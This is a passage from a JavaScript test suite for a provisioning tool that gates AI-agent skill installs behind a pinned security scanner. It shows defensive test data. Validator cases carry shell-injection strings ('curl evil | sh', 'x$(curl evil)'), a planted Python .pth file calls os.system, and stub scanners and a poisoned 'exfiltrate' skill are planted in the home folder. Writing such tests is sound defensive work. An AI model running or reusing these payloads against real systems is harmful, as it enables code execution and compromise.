    ['a bad sha256', 'web/tools.json', toolsJson([{ ...godot, sha256: SHA.toUpperCase() }])],
    ['an http:// url', 'web/tools.json', toolsJson([{ ...godot, url: 'http://example.com/godot.zip' }])],
    ['a ".." in bin', 'web/tools.json', toolsJson([{ ...godot, bin: '../godot' }])],
    ['an unknown key', 'web/tools.json', toolsJson([{ ...godot, post_install: 'echo hi' }])],
    ['a shell-like key', 'web/tools.json', toolsJson([{ ...godot, command: 'curl evil | sh' }])],
    ['a shell-like bin path', 'web/tools.json', toolsJson([{ ...godot, bin: 'x$(curl evil)' }])],
    ['a missing bin', 'web/tools.json', toolsJson([{ name: godot.name, url: godot.url, sha256: SHA, unpack: 'zip' }])],
    ['a bin with unpack none', 'web/tools.json', toolsJson([{ name: 't', url: 'https://example.com/t', sha256: SHA, unpack: 'none', bin: 't' }])],
    ['an invalid tools.json', 'web/tools.json', '{'],
    ['a non-array tools.json', 'web/tools.json', '{"name": "x"}'],
    ['a bad env name', '_all/env.txt', 'PIXEL_LAB_API_KEY\nbad-name\n'],
    ['an env value line', 'web/env.txt', 'PIXEL_LAB_API_KEY=sk-live-secret\n'],
    ['a requirement without a hash', 'web/requirements.txt', 'hypothesis==6.138.3\n'],
    ['a bare requirement name', 'web/requirements.txt', 'hypothesis\n'],
    ['extras in a requirement', 'web/requirements.txt', `pillow[extra]==12.1.0 --hash=sha256:${PIN}\n`],
    ['a pip option line', 'web/requirements.txt', '--index-url https://example.com/simple\n'],
    ['a recursive include', 'web/requirements.txt', '-r other.txt\n'],
    ['a URL requirement', 'web/requirements.txt', 'pillow @ https://example.com/pillow.whl\n'],
    ['an environment marker', 'web/requirements.txt', `pillow==12.1.0; python_version < "3" --hash=sha256:${PIN}\n`],
    ['an uppercase hash', 'web/requirements.txt', `hypothesis==6.138.3 --hash=sha256:${PIN.toUpperCase()}\n`],
    ['a duplicate package name', 'web/requirements.txt', `Pillow==12.1.0 --hash=sha256:${PIN}\npillow==12.1.1 --hash=sha256:${PIN}\n`],
  ];
  const badHome = join(tmp, 'bad-home');
  for (const [label, rel, text] of breaks) {
    writeFileSync(join(data, 'workers', rel), text);
    const br = run(['--data', data, '--skip-plugins'], badHome);
    assert.equal(br.status, 1, `${label}: the provision fails`);
    assert.ok(br.stderr.includes(join(data, 'workers', rel)), `${label}: the error names the file: ${br.stderr}`);
    assert.ok(!existsSync(join(badHome, '.ottr')), `${label}: nothing is written`);
    assert.ok(!/\d+ installed/.test(br.stdout), `${label}: nothing is installed`);
    assert.ok(!`${br.stdout}${br.stderr}`.includes('sk-live-secret'), `${label}: file content is never printed`);
    rmSync(join(data, 'workers', rel));
  }

  // A broken line is reported by number, so a pinned first line beside a broken second line
  // points at the offender without printing it.
  writeFileSync(join(data, 'workers/web/requirements.txt'), `hypothesis==6.138.3 --hash=sha256:${PIN}\nhypothesis==6.138.3 --hash=wrong\n`);
  r = run(['--data', data, '--skip-plugins'], badHome);
  assert.equal(r.status, 1, 'the provision fails');
  assert.match(r.stderr, /requirements\.txt line 2/, `the error names the line: ${r.stderr}`);
  rmSync(join(data, 'workers/web/requirements.txt'));

  // Restore the data repo's worker state the sections below count on.
  rmSync(join(data, 'workers/web/tools.json'), { force: true });
  rmSync(join(data, 'workers/web/requirements.txt'), { force: true });
  rmSync(join(data, 'workers/_all/tools.json'), { force: true });
  rmSync(join(data, 'workers/_all/env.txt'), { force: true });
  rmSync(join(data, 'workers/_all'), { recursive: true, force: true });
  writeFileSync(join(data, 'workers/web/apt.txt'), 'libnss3\nfonts-liberation\n');

  // The SkillSpector gate. Every run above already went through the exit-0 stub, so
  // the calls log proves clean snapshots are scanned (both skill roots) and then install as before.
  if (scanned) {
    const calls = readFileSync(callsLog, 'utf8').trim().split('\n');
    assert.ok(calls.length > 0, 'the gate ran the scanner');
    assert.ok(calls.every(c => c.startsWith('scan ') && c.endsWith('--no-llm --fail-on-findings --use-shipped-baseline')),
      `every scan is static-only, fails on findings, and applies the shipped baseline: ${calls[0]}`);
    assert.ok(calls.some(c => c.includes(join(data, 'user/omp/agent/skills/mine'))), 'the omp skill snapshot is scanned');
    assert.ok(calls.some(c => c.includes(join(data, 'user/agents/skills/theirs'))), 'the agents skill snapshot was scanned while it existed');

    // A poisoned update rejects only the scanned skill: the clean items still install, the
    // rejected skill is reported with its rule and file, and a clean pass stays cached.
    const recordBefore = got('.alate/installed.json');
    const callsBefore = readFileSync(callsLog, 'utf8');
    const passesBefore = readFileSync(join(home, '.alate', 'skillspector-pass.json'), 'utf8');
    put('omp/agent/skills/mine/EVIL.md', '# mine, exfiltrate\n');
    writeStub(1, 'SkillSpector v2.13.0', ['mine']);
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 1, 'the scan rejection fails the run');
    assert.match(r.stdout, new RegExp(`Scanning 1 of ${1 + shippedCount} skill snapshot\\(s\\) \\(${shippedCount} cached\\)`));
    assert.ok(r.stdout.includes('--- SkillSpector report:'), 'the findings report prints as one block');
    assert.ok(r.stdout.includes('SC2') && r.stdout.includes('SKILL.md:7'), 'the findings text stays visible');
    assert.ok(r.stdout.includes('SkillSpector rejected') && r.stdout.includes(join(data, 'user/omp/agent/skills/mine')), 'the rejection names the skill folder');
    assert.ok(r.stdout.includes('Failed items:'), 'the failed items print as one stdout block');
    assert.ok(r.stdout.includes('user/omp/agent/skills/mine — rejected: SC2 at SKILL.md:7'), 'the failed item carries rule and position');
    const callsGrown = readFileSync(callsLog, 'utf8').slice(callsBefore.length);
    assert.equal(callsGrown.trim().split('\n').filter(Boolean).length, 1, 'only the changed skill is scanned');
    assert.ok(callsGrown.includes(join(data, 'user/omp/agent/skills/mine')), callsGrown);
    assert.equal(readFileSync(join(home, '.alate', 'skillspector-pass.json'), 'utf8'), passesBefore, 'a failed scan is never cached');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')), 'the poisoned file never lands');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine')), 'the installed record-matching copy of the rejected skill is deleted');
    const recordAfter = JSON.parse(readFileSync(join(home, '.alate/installed.json'), 'utf8'));
    assert.ok(!Object.keys(recordAfter).some(rel => rel.startsWith('omp/agent/skills/mine')), 'the manifest drops the rejected skill');
    assert.ok(Object.keys(JSON.parse(recordBefore)).some(rel => rel.startsWith('omp/agent/skills/mine')), 'the fixture had mine installed');

    // A copy that changed on the machine stays when its scan rejects it: the deletion rule
    // keeps a changed copy with the existing note, and EVIL.md still never lands.
    rmSync(join(data, 'user/omp/agent/skills/mine/EVIL.md'));
    writeStub(0);
    put('omp/agent/skills/mine/SKILL.md', skillText('mine', '# mine, scan-clean\n'));
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 0, r.stderr);
    const live = '# mine, edited on the machine\n';
    writeFileSync(join(home, '.omp/agent/skills/mine/SKILL.md'), live);
    put('omp/agent/skills/mine/EVIL.md', '# mine, exfiltrate\n');
    writeStub(1, 'SkillSpector v2.13.0', ['mine']);
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 1, 'the rejection still fails the run');
    assert.equal(got('.omp/agent/skills/mine/SKILL.md'), live, 'a machine-changed copy of a rejected skill stays');
    assert.ok(r.stdout.includes('changed here, kept:'), 'the kept copy carries the existing note');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')), 'the poisoned file never lands');

    // Restore a clean, installed state for the scanner-resolution blocks below.
    writeStub(0);
    rmSync(join(data, 'user/omp/agent/skills/mine/EVIL.md'));
    rmSync(join(home, '.omp/agent/skills/mine'), { recursive: true, force: true });
    put('omp/agent/skills/mine/SKILL.md', skillText('mine', '# mine, v6\n'));
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 0, r.stderr);

    // Acceptance (a): one bad skill among good ones. Nine good skills install; the bad one
    // is reported with its rule and file; the run still exits 1.
    const scanAData = join(tmp, 'data-scan-a');
    const scanAHome = join(tmp, 'home-scan-a');
    const putA = (rel, text) => { mkdirSync(dirname(join(scanAData, 'user', rel)), { recursive: true }); writeFileSync(join(scanAData, 'user', rel), text); };
    putA('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    for (let i = 0; i < 9; i++) putA(`omp/agent/skills/good-${i}/SKILL.md`, skillText(`good-${i}`));
    putA('omp/agent/skills/bad-one/SKILL.md', skillText('bad-one'));
    writeStub(0, 'SkillSpector v2.13.0', ['bad-one']);
    r = run(['--data', scanAData, '--skip-plugins'], scanAHome);
    assert.equal(r.status, 1, 'the bad skill fails the run');
    for (let i = 0; i < 9; i++) {
      assert.equal(readFileSync(join(scanAHome, `.omp/agent/skills/good-${i}/SKILL.md`), 'utf8'), skillText(`good-${i}`), `good-${i} installs beside a rejected skill`);
    }
    assert.ok(!existsSync(join(scanAHome, '.omp/agent/skills/bad-one')), 'the bad skill never lands');
    assert.ok(r.stdout.includes('user/omp/agent/skills/bad-one — rejected: SC2 at SKILL.md:7'), 'the bad skill is reported with its rule and file');
    assert.ok(r.stdout.includes('Failed items:'), 'the failed items print as one stdout block');

    // A scan error (exit 2 — the user-host case of an unparseable .skillspector-baseline.yaml)
    // rejects only its own skill: the clean skills still install, the broken one is left out
    // and reported with the scanner message, and the run fails per item (fatal false, so the
    // server's ok stays false), not as a whole-run refusal.
    const scanBData = join(tmp, 'data-scan-b');
    const scanBHome = join(tmp, 'home-scan-b');
    const putB = (rel, text) => { mkdirSync(dirname(join(scanBData, 'user', rel)), { recursive: true }); writeFileSync(join(scanBData, 'user', rel), text); };
    putB('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    putB('omp/agent/skills/clean-one/SKILL.md', skillText('clean-one'));
    putB('omp/agent/skills/bad-base/SKILL.md', skillText('bad-base'));
    putB('omp/agent/skills/bad-base/.skillspector-baseline.yaml', 'findings: [unclosed\n');
    writeStub(0, 'SkillSpector v2.13.0', [], ['bad-base']);
    const bResults = join(tmp, 'results-scan-b.json');
    r = run(['--data', scanBData, '--skip-plugins'], scanBHome, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv'), ALATE_PROVISION_RESULTS: bResults });
    assert.equal(r.status, 1, 'the scan-error skill fails the run');
    assert.equal(readFileSync(join(scanBHome, '.omp/agent/skills/clean-one/SKILL.md'), 'utf8'), skillText('clean-one'), 'the clean skill installs beside a scan-error skill');
    assert.ok(!existsSync(join(scanBHome, '.omp/agent/skills/bad-base')), 'the scan-error skill never lands');
    assert.ok(r.stdout.includes('user/omp/agent/skills/bad-base — rejected: scan error'), 'the scan-error skill is reported with the scan-error rule');
    assert.match(r.stdout, /SkillSpector scan of .*bad-base failed \(exit 2\)/, 'the deploy log names the failed scan');
    assert.ok(r.stdout.includes('unparseable .skillspector-baseline.yaml'), 'the scanner message prints in the report block');
    const bRes = JSON.parse(readFileSync(bResults, 'utf8'));
    assert.equal(bRes.fatal, false, 'a per-skill scan error is not a whole-run refusal');
    assert.equal(bRes.error, null);
    const bBad = bRes.items.find(i => i.item === 'user/omp/agent/skills/bad-base');
    assert.equal(bBad.status, 'rejected');
    assert.equal(bBad.rule, 'scan error');
    assert.match(bBad.report, /failed \(exit 2\)/, 'the report starts with the failure line');
    assert.match(bBad.report, /unparseable \.skillspector-baseline\.yaml/, 'the scanner message travels with the item');
    assert.equal(bRes.items.find(i => i.item === 'user/omp/agent/skills/clean-one').status, 'installed');
    // A negative verdict is never cached: the next run rescans only the scan-error skill,
    // and the clean skill stays a cached pass.
    const bCallsBefore = readFileSync(callsLog, 'utf8').trim().split('\n').filter(Boolean).length;
    r = run(['--data', scanBData, '--skip-plugins'], scanBHome);
    assert.equal(r.status, 1, 'the scan error repeats on the next run');
    const bCallsGrown = readFileSync(callsLog, 'utf8').trim().split('\n').filter(Boolean).slice(bCallsBefore);
    assert.equal(bCallsGrown.length, 1, 'only the scan-error skill is rescanned');
    assert.ok(bCallsGrown[0].includes(join(scanBData, 'user/omp/agent/skills/bad-base')), 'a scan-error skill is never cached');
    assert.ok(!existsSync(join(scanBHome, '.omp/agent/skills/bad-base')), 'the scan-error skill still never lands');

    // A missing scanner refuses too: fail closed, and the error names the pinned build.
    r = run(['--data', data, '--skip-plugins'], home, { ...process.env, SKILLSPECTOR_VENV: join(tmp, 'no-venv') });
    assert.equal(r.status, 1, 'a missing scanner refuses the run');
    assert.match(r.stderr, /skillspector not found/);
    assert.match(r.stderr, /SkillSpector@v2\.13\.0/);
    assert.match(r.stderr, /python3 -m venv .*no-venv/, 'the refusal names the venv path and its rebuild command');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')));

    // A scanner that is not the pinned build refuses too, even on PATH: v2 baseline
    // fingerprints bind to the scanner version, so a different build would silently suppress
    // nothing and every accepted finding would resurface (the 2026-10-31 Windows host
    // failure: break-ui rejected on the host, accepted by the same snapshot in the
    // container). Fail closed with the pinned install command instead of a wrong verdict.
    writeStub(0, 'SkillSpector v2.12.0');
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 1, 'a scanner that is not the pinned build refuses the run');
    assert.match(r.stderr, /not the pinned SkillSpector v2\.13\.0/);
    assert.match(r.stderr, /SkillSpector@v2\.13\.0/);
    assert.ok(!/\d+ installed/.test(r.stdout), 'nothing was installed');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')));

    // Back to the pinned stub: on a non-root runner (CI) no test-created venv is trusted,
    // so the venv-preference run below must serve from this PATH stub — an off-pin stub
    // left over from the refusal test would refuse before the venv gate is even reached.
    writeStub(0);

    // The pinned venv is preferred over PATH, but only when the trust gate passes: it must
    // be root-owned on POSIX and live outside the home install-user writes into, because the
    // home volume is shared with worker agent turns (specs/skillspector-scanner-trust.md).
    const venvDir = join(tmp, 'pinned-venv');
    const venvCallsLog = join(venvDir, 'calls.log');
    mkdirSync(join(venvDir, 'bin'), { recursive: true });
    writeFileSync(join(venvDir, 'bin', 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${venvCallsLog}'\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\nexit 0\n`);
    chmodSync(join(venvDir, 'bin', 'skillspector'), 0o755);
    // The cache would answer with the PATH stub's verdicts (same version, same bytes, same
    // key), so drop it: this run must prove which scanner served.
    rmSync(join(home, '.alate', 'skillspector-pass.json'), { force: true });
    const callsBeforeVenv = readFileSync(callsLog, 'utf8');
    const venvEnv = { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: venvDir };
    r = run(['--data', data, '--skip-plugins'], home, venvEnv);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /18 unchanged/);
    if (process.getuid?.() !== 0) {
      // The test-created venv is user-owned, so a non-root runner must see it refused
      // without a probe and the PATH stub serve instead.
      assert.match(r.stdout, /skipping venv scanner at .*pinned-venv.*not owned by root/, r.stdout);
      assert.ok(readFileSync(callsLog, 'utf8').length > callsBeforeVenv.length, 'the PATH scanner served when the venv was not trusted');
      assert.ok(!existsSync(venvCallsLog), 'the untrusted venv scanner stays unused');
    } else {
      const venvCalls = readFileSync(venvCallsLog, 'utf8').trim().split('\n');
      assert.ok(venvCalls.every(c => c.startsWith('scan ') && c.endsWith('--no-llm --fail-on-findings --use-shipped-baseline')),
        `the pinned venv ran the static-only scan: ${venvCalls[0]}`);
      assert.ok(venvCalls.some(c => c.includes(join(data, 'user/omp/agent/skills/mine'))), 'the omp skill snapshot is scanned through the venv');
      assert.equal(readFileSync(callsLog, 'utf8'), callsBeforeVenv, 'the PATH scanner stays unused when the pinned venv resolves');
    }

    // Preference proof that runs on every POSIX runner: a trusted SKILLSPECTOR_BIN outside
    // the home wins over the venv and over PATH, and neither of the others runs.
    const binDir = join(tmp, 'bin-stub');
    const binCallsLog = join(binDir, 'calls.log');
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(binDir, 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${binCallsLog}'\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\nexit 0\n`);
    chmodSync(join(binDir, 'skillspector'), 0o755);
    rmSync(join(home, '.alate', 'skillspector-pass.json'), { force: true });
    // A root runner's venv branch above already ran the venv and wrote its log; drop the
    // stale fixture so this run alone proves the venv stays unused.
    rmSync(venvCallsLog, { force: true });
    const callsBeforeBin = readFileSync(callsLog, 'utf8');
    r = run(['--data', data, '--skip-plugins'], home, { ...venvEnv, SKILLSPECTOR_BIN: join(binDir, 'skillspector') });
    assert.equal(r.status, 0, r.stderr);
    assert.ok(r.stdout.includes(join(binDir, 'skillspector')), `the run names the SKILLSPECTOR_BIN scanner: ${r.stdout}`);
    const binCalls = readFileSync(binCallsLog, 'utf8').trim().split('\n');
    assert.ok(binCalls.some(c => c.startsWith('scan ') && c.includes(join(data, 'user/omp/agent/skills/mine'))), 'the SKILLSPECTOR_BIN scanner did the scans');
    assert.equal(readFileSync(callsLog, 'utf8'), callsBeforeBin, 'the PATH scanner stays unused when SKILLSPECTOR_BIN resolves');
    assert.ok(!existsSync(venvCallsLog), 'the venv stays unused when SKILLSPECTOR_BIN resolves');

    // A venv a Python upgrade broke (bin/skillspector exists but exits 1 with no output: its
    // packages sit in lib/python3.x while bin/python3 is the new interpreter, the 2026-11-01
    // ottr-alate-1 failure that stopped every provision) must not stop the run: the gate skips
    // the unusable candidate and scans with the pinned scanner on PATH.
    const brokenVenv = join(tmp, 'broken-venv');
    const brokenCallsLog = join(brokenVenv, 'calls.log');
    mkdirSync(join(brokenVenv, 'bin'), { recursive: true });
    writeFileSync(join(brokenVenv, 'bin', 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${brokenCallsLog}'\nexit 1\n`);
    chmodSync(join(brokenVenv, 'bin', 'skillspector'), 0o755);
    writeStub(0);
    rmSync(join(home, '.alate', 'skillspector-pass.json'), { force: true });
    const pathCallsBefore = readFileSync(callsLog, 'utf8');
    r = run(['--data', data, '--skip-plugins'], home, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: brokenVenv });
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /18 unchanged/);
    assert.ok(readFileSync(callsLog, 'utf8').length > pathCallsBefore.length, 'the PATH scanner scanned when the venv was broken');
    assert.ok(!existsSync(brokenCallsLog), 'the broken venv scanner stays unused');

    // A scanner that runs and reports a version below the pin refuses even when a pinned
    // scanner sits on PATH: a build below the pin would silently suppress nothing, so the
    // run refuses. SKILLSPECTOR_BIN is the trusted channel that surfaces the bad verdict on
    // any runner: the separate bin stub reports v2.12.0 while the PATH stub reports the pin.
    const oldBinDir = join(tmp, 'old-bin');
    mkdirSync(oldBinDir, { recursive: true });
    writeFileSync(join(oldBinDir, 'skillspector'), '#!/bin/sh\nif [ "$1" = "--version" ]; then echo \'SkillSpector v2.12.0\'; exit 0; fi\nexit 0\n');
    chmodSync(join(oldBinDir, 'skillspector'), 0o755);
    r = run(['--data', data, '--skip-plugins'], home, { ...venvEnv, SKILLSPECTOR_BIN: join(oldBinDir, 'skillspector') });
    assert.equal(r.status, 1, 'a scanner below the pin refuses even with a pinned PATH scanner');
    assert.match(r.stderr, /not the pinned SkillSpector v2\.13\.0/);

    // A planted venv inside the target home is never executed, even when it answers the
    // version probe with the pin: the home volume is shared with worker agent turns, so a
    // turn could plant a scanner there (specs/skillspector-scanner-trust.md). The planted
    // binary writes a marker on scan, so every check below proves it never ran.
    const plantedBin = join(home, '.cache', 'skillspector-venv', 'bin', 'skillspector');
    const plantedMarker = join(home, 'planted-marker');
    const plantedCallsLog = join(home, '.cache', 'skillspector-venv', 'planted-calls.log');
    mkdirSync(join(home, '.cache', 'skillspector-venv', 'bin'), { recursive: true });
    writeFileSync(plantedBin, `#!/bin/sh\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\n[ "$1" = scan ] && { touch '${plantedMarker}'; printf '%s\\n' "$*" >> '${plantedCallsLog}'; }\nexit 0\n`);
    chmodSync(plantedBin, 0o755);
    const stubBin = join(stubDir, 'skillspector');

    // a. SKILLSPECTOR_BIN serves, and the planted binary stays untouched — with no venv
    // override, so the default venv location under the home is exactly the planted one.
    rmSync(join(home, '.alate', 'skillspector-pass.json'), { force: true });
    const plantedCallsBefore = readFileSync(callsLog, 'utf8');
    // /usr/bin:/bin keeps the run hermetic: no stub, and no real skillspector the CI image
    // may put on PATH.
    const noVenvEnv = { PATH: '/usr/bin:/bin', HOME: home };
    delete noVenvEnv.SKILLSPECTOR_VENV;
    r = run(['--data', data, '--skip-plugins'], home, { ...noVenvEnv, SKILLSPECTOR_BIN: stubBin });
    assert.equal(r.status, 0, r.stderr);
    assert.ok(r.stdout.includes(stubBin), `the run names the SKILLSPECTOR_BIN scanner: ${r.stdout}`);
    assert.ok(!existsSync(plantedMarker), 'the planted venv scanner never ran');
    assert.ok(readFileSync(callsLog, 'utf8').length > plantedCallsBefore.length, 'the trusted stub did the scans');

    // b. Without SKILLSPECTOR_BIN the planted venv is skipped with its reason on stdout and
    // the PATH stub serves.
    rmSync(join(home, '.alate', 'skillspector-pass.json'), { force: true });
    const plantedCallsBefore2 = readFileSync(callsLog, 'utf8');
    r = run(['--data', data, '--skip-plugins'], home, { ...noVenvEnv, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}` });
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /skipping venv scanner at .*skillspector-venv.*inside the home/, r.stdout);
    assert.ok(!existsSync(plantedMarker), 'the planted venv scanner never ran');
    assert.ok(readFileSync(callsLog, 'utf8').length > plantedCallsBefore2.length, 'the PATH stub served when the planted venv was refused');

    // c. With no scanner at all the run fails closed, names the remediation, and the planted
    // binary still never runs.
    r = run(['--data', data, '--skip-plugins'], home, { ...noVenvEnv, HOME: home });
    assert.equal(r.status, 1, 'no scanner refuses the run');
    assert.match(r.stderr, /skillspector not found/);
    assert.match(r.stderr, /SKILLSPECTOR_BIN/);
    assert.ok(!existsSync(plantedMarker), 'the planted venv scanner never ran');

    // A --home given through a symlink must measure containment like the path it resolves
    // to: the default venv candidate derives from homedir(), which is the real home, so an
    // alias-anchored gate would accept a venv planted in the real home as "outside".
    const realHome = join(tmp, 'alias-real');
    const aliasHome = join(tmp, 'alias-home');
    const aliasMarker = join(realHome, 'alias-planted-marker');
    mkdirSync(join(realHome, '.cache', 'skillspector-venv', 'bin'), { recursive: true });
    symlinkSync(realHome, aliasHome, 'dir');
    writeFileSync(join(realHome, '.cache', 'skillspector-venv', 'bin', 'skillspector'),
      `#!/bin/sh\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\n[ "$1" = scan ] && touch '${aliasMarker}'\nexit 0\n`);
    chmodSync(join(realHome, '.cache', 'skillspector-venv', 'bin', 'skillspector'), 0o755);
    rmSync(join(realHome, '.alate', 'skillspector-pass.json'), { force: true });
    r = run(['--data', data, '--skip-plugins'], aliasHome, { PATH: `${stubDir}${delimiter}/usr/bin:/bin`, HOME: realHome });
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /skipping venv scanner at .*skillspector-venv.*inside the home/, r.stdout);
    assert.ok(readFileSync(callsLog, 'utf8').length > 0, 'the PATH stub served the aliased-home run');
    assert.ok(!existsSync(aliasMarker), 'the venv planted in the real home never ran through the alias');

    // A planted user-site .pth under the target home must never execute: the scanner is a pip
    // console script, so a real Python interpreter starts for the probe and the scan, and
    // Python runs every .pth file and usercustomize.py in HOME's user site-packages at
    // interpreter start. The scanner child forces PYTHONNOUSERSITE=1 for exactly this
    // (contract 7). POSIX-only, and gated on a python3 that actually loads user site — the
    // positive control below proves the planted .pth really runs without the guard, so the
    // absence check is honest.
    if (process.platform !== 'win32') {
      const pthMarker = join(home, 'pth-marker');
      const pyProbe = spawnSync('python3', ['--version'], { encoding: 'utf8' });
      const userSite = pyProbe.error || pyProbe.status !== 0 ? '' : String(spawnSync('python3', ['-c', "import sysconfig; print(sysconfig.get_path('purelib', 'posix_user'))"], { encoding: 'utf8', env: { ...process.env, HOME: home } }).stdout ?? '').trim();
      if (!userSite || !userSite.startsWith(home + sep)) {
        console.log('planted user-site check skipped: python3 user site does not live under the test home');
      } else {
        mkdirSync(userSite, { recursive: true });
        writeFileSync(join(userSite, 'evil-user-site.pth'), `import os; os.system("touch '${pthMarker}'")\n`);
        const control = spawnSync('python3', ['-c', 'pass'], { encoding: 'utf8', env: { ...process.env, HOME: home } });
        if (!existsSync(pthMarker)) {
          console.log(`planted user-site check skipped: python3 on this machine does not load user site (control exit ${control.status})`);
        } else {
          // Remove the control's marker so the guarded run's absence assertion below is
          // meaningful; the planted .pth itself stays planted for it.
          rmSync(pthMarker, { force: true });
          const pyStubDir = join(tmp, 'py-stub');
          mkdirSync(pyStubDir, { recursive: true });
          const pyStub = join(pyStubDir, 'skillspector');
          writeFileSync(pyStub, [
            '#!/usr/bin/env python3',
            'import sys',
            "if sys.argv[1] == '--version':",
            "    print('SkillSpector v2.13.0')",
            "elif sys.argv[1] == 'scan':",
            "    print('scan ' + ' '.join(sys.argv[2:]))",
            '',
          ].join('\n'));
          chmodSync(pyStub, 0o755);
          rmSync(join(home, '.alate', 'skillspector-pass.json'), { force: true });
          r = run(['--data', data, '--skip-plugins'], home, { ...process.env, HOME: home, SKILLSPECTOR_BIN: pyStub, SKILLSPECTOR_VENV: join(tmp, 'no-venv') });
          assert.equal(r.status, 0, r.stderr);
          assert.ok(r.stdout.includes(pyStub), `the run names the SKILLSPECTOR_BIN scanner: ${r.stdout}`);
          assert.ok(!existsSync(pthMarker), 'the planted user-site .pth never executed: the probe and the scan both ran with PYTHONNOUSERSITE=1');
        }
      }
    }

    // SKILLSPECTOR_BIN misconfigurations refuse without a fallback: a relative path and a
    // path inside the target home are both untrusted by contract 2 of the spec.
    r = run(['--data', data, '--skip-plugins'], home, { ...venvEnv, SKILLSPECTOR_BIN: 'skillspector' });
    assert.equal(r.status, 1, 'a relative SKILLSPECTOR_BIN refuses the run');
    assert.match(r.stderr, /absolute/);
    mkdirSync(join(home, 'bin'), { recursive: true });
    const homeBin = join(home, 'bin', 'skillspector');
    writeFileSync(homeBin, '#!/bin/sh\nif [ "$1" = "--version" ]; then echo \'SkillSpector v2.13.0\'; exit 0; fi\nexit 0\n');
    chmodSync(homeBin, 0o755);
    r = run(['--data', data, '--skip-plugins'], home, { PATH: process.env.PATH ?? '', HOME: home, SKILLSPECTOR_BIN: homeBin });
    assert.equal(r.status, 1, 'a SKILLSPECTOR_BIN inside the home refuses the run');
    assert.match(r.stderr, /home/);

    // The scanner child runs on an allowlisted environment: server secrets like ALATE_API_KEY
    // never cross the spawn boundary (contract 5), even when install-user itself carries them.
    const envStubDir = join(tmp, 'env-stub');
    const envLog = join(envStubDir, 'env.log');
    mkdirSync(envStubDir, { recursive: true });
    writeFileSync(join(envStubDir, 'skillspector'), `#!/bin/sh\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\n[ "$1" = scan ] && env | sort >> '${envLog}'\nexit 0\n`);
    chmodSync(join(envStubDir, 'skillspector'), 0o755);
    const envHome = join(tmp, 'env-home');
    r = run(['--data', data, '--skip-plugins'], envHome, {
      ...process.env,
      PATH: `${envStubDir}${delimiter}${process.env.PATH ?? ''}`,
      SKILLSPECTOR_VENV: join(tmp, 'no-venv'),
      ALATE_API_KEY: 'x'.repeat(48),
      GH_TOKEN: 'ghp_secret',
      PYTHONPATH: '/tmp/evil',
    });
    assert.equal(r.status, 0, r.stderr);
    const childEnvDump = readFileSync(envLog, 'utf8');
    assert.match(childEnvDump, /^PATH=/m, 'the scanner child keeps PATH');
    assert.doesNotMatch(childEnvDump, /ALATE_API_KEY/, 'the scanner child never sees ALATE_API_KEY');
    assert.doesNotMatch(childEnvDump, /GH_TOKEN/, 'the scanner child never sees GH_TOKEN');
    assert.doesNotMatch(childEnvDump, /PYTHONPATH/, 'the scanner child never sees PYTHONPATH');
    assert.match(childEnvDump, /PYTHONNOUSERSITE=1/, 'the scanner child forces user-site isolation (contract 7)');

    // The real verdict, on the real snapshot: the break-ui bytes the Windows host rejected on
    // 2026-10-31 (P1 at SKILL.md:36 resurfaced; the shipped baseline accepts them under the
    // pin) must install from a fresh home with no --force whenever a scanner carrying the pin
    // resolves — the container verdict, on any platform this suite runs on. Skips without a
    // pinned scanner, like the win32 stub skip above; the stub checks carry the offline part.
    const scannerBin = discoverRealScanner();
    if (!scannerBin) {
      console.log('real-skillspector checks skipped: no scanner reporting SkillSpector v2.13.0 (set SKILLSPECTOR_VENV to the pinned venv to run them)');
    } else {
      mkdirSync(join(data, 'user/agents/skills/break-ui'), { recursive: true });
      writeFileSync(join(data, 'user/agents/skills/break-ui/SKILL.md'), BREAK_UI_SKILL_MD);
      writeFileSync(join(data, 'user/agents/skills/break-ui/.skillspector-baseline.yaml'), BREAK_UI_BASELINE);
      const realHome = join(tmp, 'real-home');
      r = run(['--data', data, '--skip-plugins'], realHome,
        { ...process.env, SKILLSPECTOR_VENV: dirname(dirname(scannerBin)) });
      assert.equal(r.status, 0, r.stderr);
      assert.match(r.stdout, new RegExp(`Scanning 3 of ${3 + shippedCount} skill snapshot\\(s\\) \\(0 cached\\)`));
      assert.match(r.stdout, /at .+skillspector/, 'the run names the scanner it resolved');
      assert.equal(readFileSync(join(realHome, '.agents/skills/break-ui/SKILL.md'), 'utf8'), BREAK_UI_SKILL_MD, 'the break-ui snapshot installs byte-exact');

      // Real verdicts cache too: the same bytes under the same scanner skip the rescan.
